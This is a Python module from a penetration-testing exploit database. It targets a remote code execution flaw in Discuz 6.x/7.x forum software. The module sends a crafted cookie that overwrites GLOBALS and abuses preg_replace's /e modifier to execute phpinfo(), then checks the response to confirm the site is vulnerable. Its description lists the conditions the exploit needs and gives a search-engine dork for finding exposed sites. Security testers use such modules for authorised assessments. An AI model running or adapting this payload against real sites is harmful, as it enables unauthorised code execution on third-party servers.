#!/usr/bin/env python
#-*- coding:utf-8 -*-

'''
Pentestdb, a database for penetration test.
Copyright (c) 2014-2015 alpha1e0
'''

from script.exploit import Exploit, Result


class DiscuzRCE(Exploit):
    expName = u"Discuz 6.x 7.x cookie GLOBALS变量覆盖RCE"
    version = "1.0"
    author = "alpha1e0"
    language = "php"
    appName = "discuz"
    appVersion = "6.x 7.x"
    reference = ['http://www.wooyun.org/bugs/wooyun-2014-080723', 'http://bobao.360.cn/learning/detail/107.html']
    description = u'''
        漏洞利用条件：1.Discuz 6.x 7.x; 2.php<=5.3; 3.php.ini request_order为GP
        变量替换、利用preg_replace的/e参数实现远程命令执行
        gh: inurl:viewthread.php
    '''

    def verify(self):
        result = Result()

        sig = '_SERVER["HTTP_HOST"]'
        cookie = "GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();"
        self.headers['Cookie'] = cookie

        try:
            response = self.http.get(self.url, headers=self.headers)
        except self.http.RequestException as error:
            result['FailedInfo'] = {}
            result['FailedInfo']['reason'] = "Connection Error, {0}".format(str(error))
            return result

        if response.status_code == 200:
            if sig in response.content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Payload'] = cookie

        return result
